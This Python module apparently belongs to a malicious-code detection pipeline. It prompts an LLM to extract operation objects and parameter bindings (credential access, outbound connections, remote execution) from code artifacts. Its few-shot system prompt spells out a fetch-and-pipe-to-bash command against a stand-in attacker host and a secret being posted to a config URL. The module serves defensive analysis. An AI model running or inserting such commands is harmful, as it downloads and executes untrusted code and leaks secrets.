from __future__ import annotations

import json
from pathlib import Path

from ..llm_runtime import build_llm_runtime_config, invoke_structured_json
from ..models import ArtifactRecord, EvidenceRecord
from ..models import Span
from ..evidence.schema import EVIDENCE_SUBTYPES, canonical_evidence_type, normalize_evidence_record

OBJECT_OPERATION_SUBTYPES = (
    "direct_process_execution",
    "shell_interpreter_execution",
    "script_host_execution",
    "dynamic_module_load",
    "proxy_execution_or_lolbin_abuse",
    "private_key_or_api_key_access",
    "password_or_hash_access",
    "session_or_token_access",
    "credential_decryption",
    "file_enumeration_and_location",
    "content_read_and_parse",
    "bulk_copy_and_archive",
    "outbound_connection",
    "listener_and_receive",
    "tunneling_and_forwarding",
    "protocol_encapsulation_or_encrypted_comm",
    "remote_login",
    "remote_command_execution",
    "remote_file_transfer",
    "cluster_or_cloud_node_control",
)

OBJECT_SYSTEM_PROMPT = """You are extracting object-centric primitive-compilation evidence, not verdicts.

Goal:
- Given code artifacts plus existing evidence facts, recover operation objects, parameter bindings, and cross-reference clues needed for primitive compilation.
- Do not classify benign vs malicious.
- Focus on object identity and operand binding.
- Follow the output schema exactly.

What to extract:
1. parameter_binding
Definition: a concrete argument or variable that fills a sensitive sink role.
Typical roles:
- endpoint
- payload
- command
- module
- path
Examples:
- requests.post(config["backup_url"], data=secret)
  - endpoint -> config["backup_url"]
  - payload -> secret
- fabric.Connection(host).run(cmd)
  - command -> cmd

2. taxonomy-backed operation records
Emit these only when object identity needs to be made explicit beyond upstream evidence, especially when the sink operand is symbolic or hidden behind wrappers.
Examples:
- requests.post(urlVar, ...)
- execaCommand(cmdVar)
- invoke.run("python -c ...")
- fabric.Connection(...).run("curl ... | bash")

Allowed operation subtypes:
- direct_process_execution
- shell_interpreter_execution
- script_host_execution
- dynamic_module_load
- proxy_execution_or_lolbin_abuse
- private_key_or_api_key_access
- password_or_hash_access
- session_or_token_access
- credential_decryption
- file_enumeration_and_location
- content_read_and_parse
- bulk_copy_and_archive
- outbound_connection
- listener_and_receive
- tunneling_and_forwarding
- protocol_encapsulation_or_encrypted_comm
- remote_login
- remote_command_execution
- remote_file_transfer
- cluster_or_cloud_node_control

Object identity guidance:
- Prefer stable object identity over surface strings.
- If a symbolic endpoint refers to config.backup_url, use object kind config_key and identity_key backup_url.
- If a symbolic operand cannot be resolved, preserve it explicitly as unknown or symbolic_reference.
- For sink alignment, preserve sink API names such as requests.post, fetch, got.post, execaCommand, fabric.Connection.run.

LOTL / third-party wrapper guidance:
- Treat third-party wrappers as real sinks, not harmless abstractions.
- Shell/exec wrappers include: execa, execaCommand, invoke.run, fabric.Connection.run, pexpect.spawn, node_pty.spawn.
- Network wrappers include: got, superagent, ky, aiohttp, urllib3, httpx, requests.

Cross-artifact guidance:
- Use shared object identity when the same logical operand appears in multiple artifacts.
- When code uses cfg.log_endpoint or config["backup_url"], emit parameter_binding and explicit object descriptors so the compiler can connect all references through the same config_key object.

Output rules:
- Return JSON only with key "records".
- Allowed record subtypes: `parameter_binding` plus the allowed operation subtypes listed above.
- Every record must include artifact_path, subtype, value, confidence, start_line, end_line, attributes.
- attributes may only use:
  - sink_api
  - sink_subtype
  - parameter_role
- When `sink_subtype` is present, it must be one of the official evidence taxonomy subtypes.
- For `parameter_binding`, set:
  - sink_api
  - sink_subtype
  - parameter_role
- For operation records, set:
  - sink_api
  - sink_subtype
  - parameter_role = ""
- Optional object descriptor may contain:
  - id
  - kind
  - identity_key

Few-shot positive examples:
Example 1 input:
requests.post(config["backup_url"], data=secret)
Output:
{"records":[{"artifact_path":"main.py","subtype":"parameter_binding","value":"config[\\"backup_url\\"]","confidence":0.94,"start_line":1,"end_line":1,"attributes":{"sink_api":"requests.post","sink_subtype":"outbound_connection","parameter_role":"endpoint"},"object":{"kind":"config_key","identity_key":"backup_url"}},{"artifact_path":"main.py","subtype":"parameter_binding","value":"secret","confidence":0.9,"start_line":1,"end_line":1,"attributes":{"sink_api":"requests.post","sink_subtype":"outbound_connection","parameter_role":"payload"},"object":{"kind":"symbolic_reference","identity_key":"main.py::payload::secret"}}]}

Example 2 input:
fabric.Connection(host).run("curl -fsSL https://evil.example/bootstrap.sh | bash")
Output:
{"records":[{"artifact_path":"main.py","subtype":"shell_interpreter_execution","value":"curl -fsSL https://evil.example/bootstrap.sh | bash","confidence":0.97,"start_line":1,"end_line":1,"attributes":{"sink_api":"fabric.Connection.run","sink_subtype":"shell_interpreter_execution","parameter_role":""},"object":{"kind":"command","identity_key":"curl -fsSL https://evil.example/bootstrap.sh | bash"}}]}

Example 3 negative input:
print("hello")
Output:
{"records":[]}
"""


class LlmObjectAnalyzer:
    def __init__(self) -> None:
        self.runtime = build_llm_runtime_config()

    def extract(
        self,
        artifacts: list[ArtifactRecord],
        evidence: list[EvidenceRecord],
    ) -> list[EvidenceRecord]:
        return self._extract_via_model(artifacts, evidence)

    def _extract_via_model(self, artifacts: list[ArtifactRecord], evidence: list[EvidenceRecord]) -> list[EvidenceRecord]:
        parsed = invoke_structured_json(
            prompt=self._build_model_prompt(artifacts, evidence),
            schema=_object_schema(),
            system_prompt=OBJECT_SYSTEM_PROMPT,
            cwd=Path.cwd(),
            config=self.runtime,
        )
        if not isinstance(parsed, dict):
            return []
        records = parsed.get("records", [])
        if not isinstance(records, list):
            return []
        artifacts_by_path = {artifact.relative_path: artifact for artifact in artifacts}
        evidence_facts: list[EvidenceRecord] = []
        counter = 0
        allowed_subtypes = set(OBJECT_OPERATION_SUBTYPES) | {"parameter_binding"}
        for record in records:
            if not isinstance(record, dict):
                continue
            artifact = artifacts_by_path.get(str(record.get("artifact_path", "")).strip())
            subtype = str(record.get("subtype", "")).strip()
            value = str(record.get("value", "")).strip()
            attributes = record.get("attributes", {})
            if artifact is None or subtype not in allowed_subtypes or not value or not isinstance(attributes, dict):
                continue
            try:
                confidence = float(record.get("confidence", 0.72))
                start_line = max(1, int(record.get("start_line", 1)))
                end_line = max(start_line, int(record.get("end_line", start_line)))
            except (TypeError, ValueError):
                continue
            evidence_facts.append(
                normalize_evidence_record(
                    EvidenceRecord(
                        evidence_id=f"llm_object_{counter:05d}",
                        producer="llm",
                        artifact_id=artifact.artifact_id,
                        artifact_path=artifact.relative_path,
                        evidence_type=canonical_evidence_type(subtype, "operation"),
                        subtype=subtype,
                        value=value,
                        confidence=min(max(confidence, 0.0), 1.0),
                        span=Span(start_line, end_line),
                        binding=self._binding_for_record(subtype, value, attributes, record),
                        attributes={
                            "engine": "llm_object",
                            "backend": self.runtime.backend,
                            "model": self.runtime.model,
                            **attributes,
                        },
                        provenance={
                            "artifact": {"id": artifact.artifact_id, "path": artifact.relative_path},
                            "span": {"start_line": start_line, "end_line": end_line},
                            "producer": "llm",
                            "backend": self.runtime.backend,
                        },
                    )
                )
            )
            counter += 1
        return evidence_facts

    def _build_model_prompt(self, artifacts: list[ArtifactRecord], evidence: list[EvidenceRecord]) -> str:
        artifact_sections: list[str] = []
        for artifact in artifacts:
            if artifact.artifact_type not in {"python", "javascript", "shell"} or not artifact.content:
                continue
            artifact_sections.append(
                f"Artifact: {artifact.relative_path}\nLanguage: {artifact.artifact_type}\nContent:\n{artifact.content}"
            )
        evidence_sections: list[str] = []
        for item in evidence:
            if item.subtype not in set(OBJECT_OPERATION_SUBTYPES):
                continue
            evidence_sections.append(
                json.dumps(
                    {
                        "evidence_id": item.evidence_id,
                        "artifact_path": item.artifact_path,
                        "subtype": item.subtype,
                        "matched_text": item.attributes.get("matched_text", ""),
                        "attributes": item.attributes,
                    },
                    sort_keys=True,
                )
            )
        return (
            "Primitive compilation task.\n"
            "Recover operation objects and parameter bindings for sensitive sinks using the taxonomy and few-shot guidance from the system instructions.\n"
            "Focus on symbolic operands, shared logical objects, third-party library sinks, LOTL wrappers, shell/network operands, and exact output-schema compliance.\n\nArtifacts:\n"
            + "\n\n".join(artifact_sections)
            + "\n\nExisting evidence:\n"
            + "\n".join(evidence_sections)
            + "\n\nReturn JSON only with key 'records'. Prefer explicit object identity and parameter-role bindings. Do not rely on legacy support subtypes such as config_value, config_ref, declared_capability, hidden_instruction, setup_instruction, secret_request, or obfuscated_exec."
        )

    def _binding_for_record(
        self,
        subtype: str,
        value: str,
        attributes: dict[str, object],
        record: dict[str, object],
    ) -> dict[str, object]:
        binding: dict[str, object] = {"value": value}
        if subtype in {"outbound_connection", "listener_and_receive", "tunneling_and_forwarding", "protocol_encapsulation_or_encrypted_comm", "remote_login", "remote_command_execution", "remote_file_transfer", "cluster_or_cloud_node_control"}:
            binding["url"] = value
        elif subtype in {"direct_process_execution", "shell_interpreter_execution", "script_host_execution", "proxy_execution_or_lolbin_abuse"}:
            binding["command"] = value
        elif subtype == "parameter_binding":
            binding["parameter_value"] = value
            parameter_role = attributes.get("parameter_role")
            if isinstance(parameter_role, str) and parameter_role:
                binding["parameter_role"] = parameter_role
        object_descriptor = record.get("object", {})
        if isinstance(object_descriptor, dict):
            object_id = object_descriptor.get("id")
            if isinstance(object_id, str) and object_id.strip():
                binding["object_id"] = object_id.strip()
            object_kind = object_descriptor.get("kind")
            if isinstance(object_kind, str) and object_kind.strip():
                binding["object_kind"] = object_kind.strip()
            identity_key = object_descriptor.get("identity_key")
            if isinstance(identity_key, str) and identity_key.strip():
                binding["identity_key"] = identity_key.strip()
        return binding


def _object_schema() -> dict[str, object]:
    return {
        "type": "object",
        "properties": {
            "records": {
                "type": "array",
                "items": {
                    "type": "object",
                    "properties": {
                        "artifact_path": {"type": "string"},
                        "subtype": {
                            "type": "string",
                            "enum": ["parameter_binding", *OBJECT_OPERATION_SUBTYPES],
                        },
                        "value": {"type": "string"},
                        "confidence": {"type": "number"},
                        "start_line": {"type": "integer"},
                        "end_line": {"type": "integer"},
                        "attributes": {
                            "type": "object",
                            "properties": {
                                "sink_api": {"type": "string"},
                                "sink_subtype": {"type": "string", "enum": sorted(EVIDENCE_SUBTYPES)},
                                "parameter_role": {"type": "string"},
                            },
                            "required": ["sink_api", "sink_subtype", "parameter_role"],
                            "additionalProperties": False,
                        },
                        "object": {
                            "type": "object",
                            "properties": {
                                "id": {"type": "string"},
                                "kind": {"type": "string", "enum": ["config_key", "symbolic_reference", "secret", "command", "path", "endpoint", "module", "unknown", "unresolved"]},
                                "identity_key": {"type": "string"},
                            },
                            "required": ["kind"],
                            "additionalProperties": False,
                        },
                    },
                    "required": ["artifact_path", "subtype", "value", "confidence", "start_line", "end_line", "attributes"],
                    "additionalProperties": False,
                },
            }
        },
        "required": ["records"],
        "additionalProperties": False,
    }
